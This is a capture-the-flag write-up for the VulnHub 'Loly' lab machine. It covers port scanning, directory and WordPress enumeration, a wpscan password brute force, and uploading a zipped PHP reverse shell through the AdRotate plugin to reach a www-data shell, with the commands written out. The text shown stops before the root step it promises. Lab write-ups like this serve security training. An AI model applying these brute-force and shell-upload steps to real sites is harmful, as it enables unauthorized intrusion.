You can find the machine there > [Loly](https://www.vulnhub.com/entry/loly-1,538/){:target="_blank"}

## Summary

This machine is an easy one, starting off we can find a wordpress installation and we gain access to it by running a brute force attack on the user. Shell uploading was a bit tricky, because common ways were blocked. After privilege escalation to first user was pretty easy we just have to look at wp-config file a really common method & the root one is based :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

```
$ ip=192.168.1.15
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 22:22 EEST
Nmap scan report for loly.lc (192.168.1.15)
Host is up (0.0013s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:C1:62:D5 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.26 seconds
$ nmap -p 80 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 22:23 EEST
Nmap scan report for loly.lc (192.168.1.15)
Host is up (0.00038s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
```

Visiting the web page, is just the default nginx page. No `/robots.txt` and such stuff so let's move on and run `gobuster`.

```
$ gobuster dir -q -u http://$ip/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html
/wordpress (Status: 301)
```

`/wordpress` isn't loading properly, checking the html code we can see a `dns-prefetch` and a domain name that's probably a virtual host let's add it to `/etc/hosts`.

```html
<link rel='dns-prefetch' href='//loly.lc'/>
```

```
$ nano /etc/hosts
$ cat /etc/hosts
..data..
192.168.1.15    loly.lc
```

Now we can see the wordpress site, let's run a `wpscan` on it to detect plugins/users.

```
$ wpscan --no-banner --url http://loly.lc/wordpress/ -e ap,u

..data..

 ```

Interesting, without wasting more time let's run a brute force attack on loly user.

```
$ wpscan --no-banner --url http://loly.lc/wordpress/ -U loly -P /usr/share/wordlists/rockyou.txt 

..data..

## Shell as www-data

Perfect now we can login in, admin panel is under `/wp-admin`. Here i got stuck for couple of minutes, tried ton of stuff but no luck spawning a shell. Anyway then i remembered the plugin `adrotate` i enumerated a bit and i found a way to upload a shell & execute it! Follow my steps:

1) Zip your shell!

```
$ zip shell.zip shell.php 
  adding: shell.php (deflated 59%)
```

2) Upload it

3) Execute it

Enumerating the settings of the plugin i found out the where it saves the files:

![](https://i.imgur.com/NFf6z9B.png)

```
$ curl http://loly.lc/wordpress/wp-content/banners/shell.php
```

```
$ nc -lvp 6666
listening on [any] 6666 ...
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
